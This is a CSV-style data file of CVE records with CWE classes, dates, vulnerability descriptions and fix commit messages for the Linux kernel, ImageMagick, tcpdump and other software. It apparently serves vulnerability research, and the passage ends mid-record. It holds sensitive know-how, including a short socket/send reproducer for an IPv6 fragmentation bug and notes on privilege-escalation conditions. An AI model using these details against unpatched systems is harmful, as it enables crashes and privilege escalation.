CVE-2019-16347,CWE-682,2019-09-16,"ngiflib 0.4 has a heap-based buffer overflow in WritePixels() in ngiflib.c when called from DecodeGifImg, because deinterlacing for small pictures is mishandled.",fixes #12
CVE-2015-8957,CWE-119,2017-04-20,Buffer overflow in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (application crash) via a crafted SUN file.,
CVE-2019-12439,CWE-20,2019-05-29,"bubblewrap.c in Bubblewrap before 0.3.3 misuses temporary directories in /tmp as a mount point. In some particular configurations (related to XDG_RUNTIME_DIR), a local attacker may abuse this flaw to prevent other users from executing bubblewrap or potentially execute code.","An attacker could pre-create /tmp/.bubblewrap-$UID and make it a non-directory, non-symlink (in which case mounting our tmpfs would fail, causing denial of service), or make it a symlink under their control (potentially allowing bad things if the protected_symlinks sysctl is not enabled).  Instead, temporarily mount the tmpfs on a directory that we are sure exists and is not attacker-controlled. /tmp (the directory itself, not a subdirectory) will do.  Fixes: #304 Bug-Debian: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=923557 Signed-off-by: Simon McVittie <smcv@debian.org>  Closes: #305 Approved by: cgwalters"
CVE-2015-8844,CWE-20,2016-04-27,"The signal implementation in the Linux kernel before 4.3.5 on powerpc platforms does not check for an MSR with both the S and T bits set, which allows local users to cause a denial of service (TM Bad Thing exception and panic) via a crafted application.","Currently we allow both the MSR T and S bits to be set by userspace on a signal return.  Unfortunately this is a reserved configuration and will cause a TM Bad Thing exception if attempted (via rfid).  This patch checks for this case in both the 32 and 64 bit signals code.  If both T and S are set, we mark the context as invalid.  Found using a syscall fuzzer.  Fixes: 2b0a576 (""powerpc: Add new transactional memory state to the signal context"") Cc: stable@vger.kernel.org # v3.9+ Signed-off-by: Michael Neuling <mikey@neuling.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
CVE-2017-7533,CWE-362,2017-08-05,Race condition in the fsnotify implementation in the Linux kernel through 4.12.4 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted application that leverages simultaneous execution of the inotify_handle_event and vfs_rename functions.,"take_dentry_name_snapshot() takes a safe snapshot of dentry name; if the name is a short one, it gets copied into caller-supplied structure, otherwise an extra reference to external name is grabbed (those are never modified).  In either case the pointer to stable string is stored into the same structure.  dentry must be held by the caller of take_dentry_name_snapshot(), but may be freely dropped afterwards - the snapshot will stay until destroyed by release_dentry_name_snapshot().  Intended use: 	struct name_snapshot s;  	take_dentry_name_snapshot(&s, dentry); 	... 	access s.name 	... 	release_dentry_name_snapshot(&s);  Replaces fsnotify_oldname_...(), gets used in fsnotify to obtain the name to pass down with event.  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2018-16839,CWE-119,2018-10-31,Curl versions 7.33.0 through 7.61.1 are vulnerable to a buffer overrun in the SASL authentication code that may lead to denial of service.,CVE-2018-16839 Reported-by: Harry Sintonen Bug: https://curl.haxx.se/docs/CVE-2018-16839.html
CVE-2018-14465,CWE-125,2019-10-03,The RSVP parser in tcpdump before 4.9.3 has a buffer over-read in print-rsvp.c:rsvp_obj_print().,In rsvp_obj_print().  This fixes a buffer over-read discovered by Bhargava Shastry.  Add a test using the capture file supplied by the reporter(s).
CVE-2016-9557,CWE-190,2017-03-23,Integer overflow in jas_image.c in JasPer before 1.900.25 allows remote attackers to cause a denial of service (application crash) via a crafted file.,"reworked in order to avoid pollution of the global namespace.  Some problematic types like uchar, ulong, and friends have been replaced with names with a jas_ prefix.  An option max_samples has been added to the BMP and JPEG decoders to restrict the maximum size of image that they can decode.  This change was made as a (possibly temporary) fix to address security concerns. A max_samples command-line option has also been added to imginfo.  Whether an image component (for jas_image_t) is stored in memory or on disk is now based on the component size (rather than the image size).  Some debug log message were added.  Some new integer overflow checks were added.  Some new safe integer add/multiply functions were added.  More pre-C99 cruft was removed.  JasPer has numerous ""hacks"" to handle pre-C99 compilers.  JasPer now assumes C99 support.  So, this pre-C99 cruft is unnecessary and can be removed.  The regression jasper-doublefree-mem_close.jpg has been re-enabled. Theoretically, it should work more predictably now."
CVE-2017-6197,CWE-476,2017-02-24,"The r_read_* functions in libr/include/r_endian.h in radare2 1.2.1 allow remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted binary file, as demonstrated by the r_read_le32 function.",
CVE-2019-15917,CWE-416,2019-09-04,An issue was discovered in the Linux kernel before 5.0.5. There is a use-after-free issue when hci_uart_register_dev() fails in hci_uart_set_proto() in drivers/bluetooth/hci_ldisc.c.,"task A:                                task B: hci_uart_set_proto                     flush_to_ldisc  - p->open(hu) -> h5_open  //alloc h5  - receive_buf  - set_bit HCI_UART_PROTO_READY         - tty_port_default_receive_buf  - hci_uart_register_dev                 - tty_ldisc_receive_buf                                           - hci_uart_tty_receive 				           - test_bit HCI_UART_PROTO_READY 				            - h5_recv  - clear_bit HCI_UART_PROTO_READY             while() {  - p->open(hu) -> h5_close //free h5 				              - h5_rx_3wire_hdr 				               - h5_reset()  //use-after-free                                               }  It could use ioctl to set hci uart proto, but there is a use-after-free issue when hci_uart_register_dev() fail in hci_uart_set_proto(), see stack above, fix this by setting HCI_UART_PROTO_READY bit only when hci_uart_register_dev() return success.  Reported-by: syzbot+899a33dc0fa0dbaf06a6@syzkaller.appspotmail.com Signed-off-by: Kefeng Wang <wangkefeng.wang@huawei.com> Reviewed-by: Jeremy Cline <jcline@redhat.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>"
CVE-2017-8294,CWE-125,2017-04-27,libyara/re.c in the regex component in YARA 3.5.0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted rule that is mishandled in the yr_re_exec function.,* Fix issue #646 and some edge cases with wide regexps using \b and \B  * Rename function IS_WORD_CHAR to _yr_re_is_word_char
CVE-2017-9143,CWE-772,2017-05-22,"In ImageMagick 7.0.5-5, the ReadARTImage function in coders/art.c allows attackers to cause a denial of service (memory leak) via a crafted .art file.",
CVE-2016-2069,CWE-362,2016-04-27,Race condition in arch/x86/mm/tlb.c in the Linux kernel before 4.4.1 allows local users to gain privileges by triggering access to a paging structure by a different CPU.,"When switch_mm() activates a new PGD, it also sets a bit that tells other CPUs that the PGD is in use so that TLB flush IPIs will be sent.  In order for that to work correctly, the bit needs to be visible prior to loading the PGD and therefore starting to fill the local TLB.  Document all the barriers that make this work correctly and add a couple that were missing.  Signed-off-by: Andy Lutomirski <luto@kernel.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Brian Gerst <brgerst@gmail.com> Cc: Dave Hansen <dave.hansen@linux.intel.com> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Rik van Riel <riel@redhat.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: linux-mm@kvack.org Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2014-1738,CWE-200,2014-05-11,"The raw_cmd_copyout function in drivers/block/floppy.c in the Linux kernel through 3.14.3 does not properly restrict access to certain pointers during processing of an FDRAWCMD ioctl call, which allows local users to obtain sensitive information from kernel heap memory by leveraging write access to a /dev/fd device.",Do not leak kernel-only floppy_raw_cmd structure members to userspace. This includes the linked-list pointer and the pointer to the allocated DMA space.  Signed-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2017-13038,CWE-125,2017-09-14,The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().,This fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.  Add a test using the capture file supplied by Katie Holly.
CVE-2017-9074,CWE-125,2017-05-19,"The IPv6 fragmentation implementation in the Linux kernel through 4.11.1 does not consider that the nexthdr field may be associated with an invalid option, which allows local users to cause a denial of service (out-of-bounds read and BUG) or possibly have unspecified other impact via crafted socket and send system calls.","The KASAN warning repoted below was discovered with a syzkaller program.  The reproducer is basically:   int s = socket(AF_INET6, SOCK_RAW, NEXTHDR_HOP);   send(s, &one_byte_of_data, 1, MSG_MORE);   send(s, &more_than_mtu_bytes_data, 2000, 0);  The socket() call sets the nexthdr field of the v6 header to NEXTHDR_HOP, the first send call primes the payload with a non zero byte of data, and the second send call triggers the fragmentation path.  The fragmentation code tries to parse the header options in order to figure out where to insert the fragment option.  Since nexthdr points to an invalid option, the calculation of the size of the network header can made to be much larger than the linear section of the skb and data is read outside of it.  This fix makes ip6_find_1stfrag return an error if it detects running out-of-bounds.  [   42.361487] ================================================================== [   42.364412] BUG: KASAN: slab-out-of-bounds in ip6_fragment+0x11c8/0x3730 [   42.365471] Read of size 840 at addr ffff88000969e798 by task ip6_fragment-oo/3789 [   42.366469] [   42.366696] CPU: 1 PID: 3789 Comm: ip6_fragment-oo Not tainted 4.11.0+ #41 [   42.367628] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04/01/2014 [   42.368824] Call Trace: [   42.369183]  dump_stack+0xb3/0x10b [   42.369664]  print_address_description+0x73/0x290 [   42.370325]  kasan_report+0x252/0x370 [   42.370839]  ? ip6_fragment+0x11c8/0x3730 [   42.371396]  check_memory_region+0x13c/0x1a0 [   42.371978]  memcpy+0x23/0x50 [   42.372395]  ip6_fragment+0x11c8/0x3730 [   42.372920]  ? nf_ct_expect_unregister_notifier+0x110/0x110 [   42.373681]  ? ip6_copy_metadata+0x7f0/0x7f0 [   42.374263]  ? ip6_forward+0x2e30/0x2e30 [   42.374803]  ip6_finish_output+0x584/0x990 [   42.375350]  ip6_output+0x1b7/0x690 [   42.375836]  ? ip6_finish_output+0x990/0x990 [   42.376411]  ? ip6_fragment+0x3730/0x3730 [   42.376968]  ip6_local_out+0x95/0x160 [   42.377471]  ip6_send_skb+0xa1/0x330 [   42.377969]  ip6_push_pending_frames+0xb3/0xe0 [   42.378589]  rawv6_sendmsg+0x2051/0x2db0 [   42.379129]  ? rawv6_bind+0x8b0/0x8b0 [   42.379633]  ? _copy_from_user+0x84/0xe0 [   42.380193]  ? debug_check_no_locks_freed+0x290/0x290 [   42.380878]  ? ___sys_sendmsg+0x162/0x930 [   42.381427]  ? rcu_read_lock_sched_held+0xa3/0x120 [   42.382074]  ? sock_has_perm+0x1f6/0x290 [   42.382614]  ? ___sys_sendmsg+0x167/0x930 [   42.383173]  ? lock_downgrade+0x660/0x660 [   42.383727]  inet_sendmsg+0x123/0x500 [   42.384226]  ? inet_sendmsg+0x123/0x500 [   42.384748]  ? inet_recvmsg+0x540/0x540 [   42.385263]  sock_sendmsg+0xca/0x110 [   42.385758]  SYSC_sendto+0x217/0x380 [   42.386249]  ? SYSC_connect+0x310/0x310 [   42.386783]  ? __might_fault+0x110/0x1d0 [   42.387324]  ? lock_downgrade+0x660/0x660 [   42.387880]  ? __fget_light+0xa1/0x1f0 [   42.388403]  ? __fdget+0x18/0x20 [   42.388851]  ? sock_common_setsockopt+0x95/0xd0 [   42.389472]  ? SyS_setsockopt+0x17f/0x260 [   42.390021]  ? entry_SYSCALL_64_fastpath+0x5/0xbe [   42.390650]  SyS_sendto+0x40/0x50 [   42.391103]  entry_SYSCALL_64_fastpath+0x1f/0xbe [   42.391731] RIP: 0033:0x7fbbb711e383 [   42.392217] RSP: 002b:00007ffff4d34f28 EFLAGS: 00000246 ORIG_RAX: 000000000000002c [   42.393235] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fbbb711e383 [   42.394195] RDX: 0000000000001000 RSI: 00007ffff4d34f60 RDI: 0000000000000003 [   42.395145] RBP: 0000000000000046 R08: 00007ffff4d34f40 R09: 0000000000000018 [   42.396056] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000400aad [   42.396598] R13: 0000000000000066 R14: 00007ffff4d34ee0 R15: 00007fbbb717af00 [   42.397257] [   42.397411] Allocated by task 3789: [   42.397702]  save_stack_trace+0x16/0x20 [   42.398005]  save_stack+0x46/0xd0 [   42.398267]  kasan_kmalloc+0xad/0xe0 [   42.398548]  kasan_slab_alloc+0x12/0x20 [   42.398848]  __kmalloc_node_track_caller+0xcb/0x380 [   42.399224]  __kmalloc_reserve.isra.32+0x41/0xe0 [   42.399654]  __alloc_skb+0xf8/0x580 [   42.400003]  sock_wmalloc+0xab/0xf0 [   42.400346]  __ip6_append_data.isra.41+0x2472/0x33d0 [   42.400813]  ip6_append_data+0x1a8/0x2f0 [   42.401122]  rawv6_sendmsg+0x11ee/0x2db0 [   42.401505]  inet_sendmsg+0x123/0x500 [   42.401860]  sock_sendmsg+0xca/0x110 [   42.402209]  ___sys_sendmsg+0x7cb/0x930 [   42.402582]  __sys_sendmsg+0xd9/0x190 [   42.402941]  SyS_sendmsg+0x2d/0x50 [   42.403273]  entry_SYSCALL_64_fastpath+0x1f/0xbe [   42.403718] [   42.403871] Freed by task 1794: [   42.404146]  save_stack_trace+0x16/0x20 [   42.404515]  save_stack+0x46/0xd0 [   42.404827]  kasan_slab_free+0x72/0xc0 [   42.405167]  kfree+0xe8/0x2b0 [   42.405462]  skb_free_head+0x74/0xb0 [   42.405806]  skb_release_data+0x30e/0x3a0 [   42.406198]  skb_release_all+0x4a/0x60 [   42.406563]  consume_skb+0x113/0x2e0 [   42.406910]  skb_free_datagram+0x1a/0xe0 [   42.407288]  netlink_recvmsg+0x60d/0xe40 [   42.407667]  sock_recvmsg+0xd7/0x110 [   42.408022]  ___sys_recvmsg+0x25c/0x580 [   42.408395]  __sys_recvmsg+0xd6/0x190 [   42.408753]  SyS_recvmsg+0x2d/0x50 [   42.409086]  entry_SYSCALL_64_fastpath+0x1f/0xbe [   42.409513] [   42.409665] The buggy address belongs to the object at ffff88000969e780 [   42.409665]  which belongs to the cache kmalloc-512 of size 512 [   42.410846] The buggy address is located 24 bytes inside of [   42.410846]  512-byte region [ffff88000969e780, ffff88000969e980) [   42.411941] The buggy address belongs to the page: [   42.412405] page:ffffea000025a780 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0 [   42.413298] flags: 0x100000000008100(slab|head) [   42.413729] raw: 0100000000008100 0000000000000000 0000000000000000 00000001800c000c [   42.414387] raw: ffffea00002a9500 0000000900000007 ffff88000c401280 0000000000000000 [   42.415074] page dumped because: kasan: bad access detected [   42.415604] [   42.415757] Memory state around the buggy address: [   42.416222]  ffff88000969e880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 [   42.416904]  ffff88000969e900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 [   42.417591] >ffff88000969e980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   42.418273]                    ^ [   42.418588]  ffff88000969ea00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [   42.419273]  ffff88000969ea80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [   42.419882] ==================================================================  Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Craig Gallek <kraig@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-1826,,2013-03-22,"The xfrm_state_netlink function in net/xfrm/xfrm_user.c in the Linux kernel before 3.5.7 does not properly handle error conditions in dump_one_state function calls, which allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) by leveraging the CAP_NET_ADMIN capability.","When dump_one_state() returns an error, e.g. because of a too small buffer to dump the whole xfrm state, xfrm_state_netlink() returns NULL instead of an error pointer. But its callers expect an error pointer and therefore continue to operate on a NULL skbuff.  This could lead to a privilege escalation (execution of user code in kernel context) if the attacker has CAP_NET_ADMIN and is able to map address 0.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-7584,CWE-119,2018-03-01,"In PHP through 5.6.33, 7.0.x before 7.0.28, 7.1.x through 7.1.14, and 7.2.x through 7.2.2, there is a stack-based buffer under-read while parsing an HTTP response in the php_stream_url_wrap_http_ex function in ext/standard/http_fopen_wrapper.c. This subsequently results in copying a large string.",
CVE-2017-5986,CWE-362,2017-02-18,Race condition in the sctp_wait_for_sndbuf function in net/sctp/socket.c in the Linux kernel before 4.9.11 allows local users to cause a denial of service (assertion failure and panic) via a multithreaded application that peels off an association in a certain buffer-full state.,"Alexander Popov reported that an application may trigger a BUG_ON in sctp_wait_for_sndbuf if the socket tx buffer is full, a thread is waiting on it to queue more data and meanwhile another thread peels off the association being used by the first thread.  This patch replaces the BUG_ON call with a proper error handling. It will return -EPIPE to the original sendmsg call, similarly to what would have been done if the association wasn't found in the first place.  Acked-by: Alexander Popov <alex.popov@linux.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-15859,CWE-476,2018-08-25,"Unchecked NULL pointer usage when parsing invalid atoms in ExprResolveLhs in xkbcomp/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file, because lookup failures are mishandled.","If we fail atom lookup, then we should not claim that we successfully looked up the expression.  Signed-off-by: Daniel Stone <daniels@collabora.com>"
CVE-2017-16995,CWE-119,2017-12-27,The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.4 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.,"Distinguish between BPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit) and BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit); only perform sign extension in the first case.  Starting with v4.14, this is exploitable by unprivileged users as long as the unprivileged_bpf_disabled sysctl isn't set.  Debian assigned CVE-2017-16995 for this issue.  v3:  - add CVE number (Ben Hutchings)  Fixes: 4846113 (""bpf: allow access into map value arrays"") Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Edward Cree <ecree@solarflare.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2019-1010317,CWE-457,2019-07-11,"WavPack 5.1.0 and earlier is affected by: CWE-457: Use of Uninitialized Variable. The impact is: Unexpected control flow, crashes, and segfaults. The component is: ParseCaffHeaderConfig (caff.c:486). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https://github.com/dbry/WavPack/commit/f68a9555b548306c5b1ee45199ccdc4a16a6101b.",
CVE-2013-1819,CWE-20,2013-03-06,"The _xfs_buf_find function in fs/xfs/xfs_buf.c in the Linux kernel before 3.7.6 does not validate block numbers, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by leveraging the ability to mount an XFS filesystem containing a metadata inode with an invalid extent map.","When _xfs_buf_find is passed an out of range address, it will fail to find a relevant struct xfs_perag and oops with a null dereference. This can happen when trying to walk a filesystem with a metadata inode that has a partially corrupted extent map (i.e. the block number returned is corrupt, but is otherwise intact) and we try to read from the corrupted block address.  In this case, just fail the lookup. If it is readahead being issued, it will simply not be done, but if it is real read that fails we will get an error being reported.  Ideally this case should result in an EFSCORRUPTED error being reported, but we cannot return an error through xfs_buf_read() or xfs_buf_get() so this lookup failure may result in ENOMEM or EIO errors being reported instead.  Signed-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Ben Myers <bpm@sgi.com>"
CVE-2018-1000037,CWE-20,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple reachable assertions in the PDF parser allow an attacker to cause a denial of service (assert crash) via a crafted file.",
CVE-2019-17113,CWE-120,2019-10-04,"In libopenmpt before 0.3.19 and 0.4.x before 0.4.9, ModPlug_InstrumentName and ModPlug_SampleName in libopenmpt_modplug.c do not restrict the lengths of libmodplug output-buffer strings in the C API, leading to a buffer overflow.",git-svn-id: https://source.openmpt.org/svn/openmpt/trunk/OpenMPT@12127 56274372-70c3-4bfc-bfc3-4c3a0b034d27
CVE-2016-7532,CWE-125,2017-04-20,coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2012-3520,CWE-287,2012-10-03,"The Netlink implementation in the Linux kernel before 3.2.30 does not properly handle messages that lack SCM_CREDENTIALS data, which might allow local users to spoof Netlink communication via a crafted message, as demonstrated by a message to (1) Avahi or (2) NetworkManager.","Pablo Neira Ayuso discovered that avahi and potentially NetworkManager accept spoofed Netlink messages because of a kernel bug.  The kernel passes all-zero SCM_CREDENTIALS ancillary data to the receiver if the sender did not provide such data, instead of not including any such data at all or including the correct data from the peer (as it is the case with AF_UNIX).  This bug was introduced in commit 16e5726 (af_unix: dont send SCM_CREDENTIALS by default)  This patch forces passing credentials for netlink, as before the regression.  Another fix would be to not add SCM_CREDENTIALS in netlink messages if not provided by the sender, but it might break some programs.  With help from Florian Weimer & Petr Matousek  This issue is designated as CVE-2012-3520  Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Petr Matousek <pmatouse@redhat.com> Cc: Florian Weimer <fweimer@redhat.com> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10030,CWE-284,2017-01-05,"The _prolog_error function in slurmd/req.c in Slurm before 15.08.13, 16.x before 16.05.7, and 17.x before 17.02.0-pre4 has a vulnerability in how the slurmd daemon informs users of a Prolog failure on a compute node. That vulnerability could allow a user to assume control of an arbitrary file on the system. Any exploitation of this is dependent on the user being able to cause or anticipate the failure (non-zero return code) of a Prolog script that their job would run on. This issue affects all Slurm versions from 0.6.0 (September 2005) to present. Workarounds to prevent exploitation of this are to either disable your Prolog script, or modify it such that it always returns 0 (""success"") and adjust it to set the node as down using scontrol instead of relying on the slurmd to handle that automatically. If you do not have a Prolog set you are unaffected by this issue.",Fix security issue caused by insecure file path handling triggered by the failure of a Prolog script. To exploit this a user needs to anticipate or cause the Prolog to fail for their job.  (This commit is slightly different from the fix to the 15.08 branch.)  CVE-2016-10030.
CVE-2013-1763,CWE-20,2013-02-28,Array index error in the __sock_diag_rcv_msg function in net/core/sock_diag.c in the Linux kernel before 3.7.10 allows local users to gain privileges via a large family value in a Netlink message.,Userland can send a netlink message requesting SOCK_DIAG_BY_FAMILY with a family greater or equal then AF_MAX -- the array size of sock_diag_handlers[]. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-10251,CWE-190,2017-03-15,"Integer overflow in the jpc_pi_nextcprl function in jpc_t2cod.c in JasPer before 1.900.20 allows remote attackers to have unspecified impact via a crafted file, which triggers use of an uninitialized value.",in the use of uninitialized data.
CVE-2013-0216,CWE-20,2013-02-18,The Xen netback functionality in the Linux kernel before 3.7.8 allows guest OS users to cause a denial of service (loop) by triggering ring pointer corruption.,"A buggy or malicious frontend should not be able to confuse netback. If we spot anything which is not as it should be then shutdown the device and don't try to continue with the ring in a potentially hostile state. Well behaved and non-hostile frontends will not be penalised.  As well as making the existing checks for such errors fatal also add a new check that ensures that there isn't an insane number of requests on the ring (i.e. more than would fit in the ring). If the ring contains garbage then previously is was possible to loop over this insane number, getting an error each time and therefore not generating any more pending requests and therefore not exiting the loop in xen_netbk_tx_build_gops for an externded period.  Also turn various netdev_dbg calls which no precipitate a fatal error into netdev_err, they are rate limited because the device is shutdown afterwards.  This fixes at least one known DoS/softlockup of the backend domain.  Signed-off-by: Ian Campbell <ian.campbell@citrix.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Acked-by: Jan Beulich <JBeulich@suse.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-14462,CWE-125,2019-10-03,The ICMP parser in tcpdump before 4.9.3 has a buffer over-read in print-icmp.c:icmp_print().,In icmp_print().  This fixes a buffer over-read discovered by Bhargava Shastry.  Add two tests using the capture files supplied by the reporter(s).
CVE-2018-21010,CWE-787,2019-09-05,OpenJPEG before 2.3.1 has a heap buffer overflow in color_apply_icc_profile in bin/common/color.c.,Derived from a patch by Thuan Pham
CVE-2018-8789,CWE-125,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains several Out-Of-Bounds Reads in the NTLM Authentication module that results in a Denial of Service (segfault).,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2011-4086,CWE-119,2012-07-03,"The journal_unmap_buffer function in fs/jbd2/transaction.c in the Linux kernel before 3.3.1 does not properly handle the _Delay and _Unwritten buffer head states, which allows local users to cause a denial of service (system crash) by leveraging the presence of an ext4 filesystem that was mounted with a journal.","journal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head state ala discard_buffer(), but does not touch _Delay or _Unwritten as discard_buffer() does.  This can be problematic in some areas of the ext4 code which assume that if they have found a buffer marked unwritten or delay, then it's a live one.  Perhaps those spots should check whether it is mapped as well, but if jbd2 is going to tear down a buffer, let's really tear it down completely.  Without this I get some fsx failures on sub-page-block filesystems up until v3.2, at which point 4e96b2d and 189e868 make the failures go away, because buried within that large change is some more flag clearing.  I still think it's worth doing in jbd2, since ->invalidatepage leads here directly, and it's the right place to clear away these flags.  Signed-off-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu> Cc: stable@vger.kernel.org"
CVE-2014-9907,CWE-20,2017-04-19,coders/dds.c in ImageMagick allows remote attackers to cause a denial of service via a crafted DDS file.,
CVE-2016-5688,CWE-119,2016-12-13,"The WPG parser in ImageMagick before 6.9.4-4 and 7.x before 7.0.1-5, when a memory limit is set, allows remote attackers to have unspecified impact via vectors related to the SetImageExtent return-value check, which trigger (1) a heap-based buffer overflow in the SetPixelIndex function or an invalid write operation in the (2) ScaleCharToQuantum or (3) SetPixelIndex functions.",
CVE-2016-8677,,2017-02-15,"The AcquireQuantumPixels function in MagickCore/quantum.c in ImageMagick before 7.0.3-1 allows remote attackers to have unspecified impact via a crafted image file, which triggers a memory allocation failure.",
CVE-2017-15537,CWE-200,2017-10-17,"The x86/fpu (Floating Point Unit) subsystem in the Linux kernel before 4.13.5, when a processor supports the xsave feature but not the xsaves feature, does not correctly handle attempts to set reserved bits in the xstate header via the ptrace() or rt_sigreturn() system call, allowing local users to read the FPU registers of other processes on the system, related to arch/x86/kernel/fpu/regset.c and arch/x86/kernel/fpu/signal.c.","On x86, userspace can use the ptrace() or rt_sigreturn() system calls to set a task's extended state (xstate) or ""FPU"" registers.  ptrace() can set them for another task using the PTRACE_SETREGSET request with NT_X86_XSTATE, while rt_sigreturn() can set them for the current task. In either case, registers can be set to any value, but the kernel assumes that the XSAVE area itself remains valid in the sense that the CPU can restore it.  However, in the case where the kernel is using the uncompacted xstate format (which it does whenever the XSAVES instruction is unavailable), it was possible for userspace to set the xcomp_bv field in the xstate_header to an arbitrary value.  However, all bits in that field are reserved in the uncompacted case, so when switching to a task with nonzero xcomp_bv, the XRSTOR instruction failed with a #GP fault.  This caused the WARN_ON_FPU(err) in copy_kernel_to_xregs() to be hit.  In addition, since the error is otherwise ignored, the FPU registers from the task previously executing on the CPU were leaked.  Fix the bug by checking that the user-supplied value of xcomp_bv is 0 in the uncompacted case, and returning an error otherwise.  The reason for validating xcomp_bv rather than simply overwriting it with 0 is that we want userspace to see an error if it (incorrectly) provides an XSAVE area in compacted format rather than in uncompacted format.  Note that as before, in case of error we clear the task's FPU state. This is perhaps non-ideal, especially for PTRACE_SETREGSET; it might be better to return an error before changing anything.  But it seems the ""clear on error"" behavior is fine for now, and it's a little tricky to do otherwise because it would mean we couldn't simply copy the full userspace state into kernel memory in one __copy_from_user().  This bug was found by syzkaller, which hit the above-mentioned WARN_ON_FPU():      WARNING: CPU: 1 PID: 0 at ./arch/x86/include/asm/fpu/internal.h:373 __switch_to+0x5b5/0x5d0     CPU: 1 PID: 0 Comm: swapper/1 Not tainted 4.13.0 #453     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011     task: 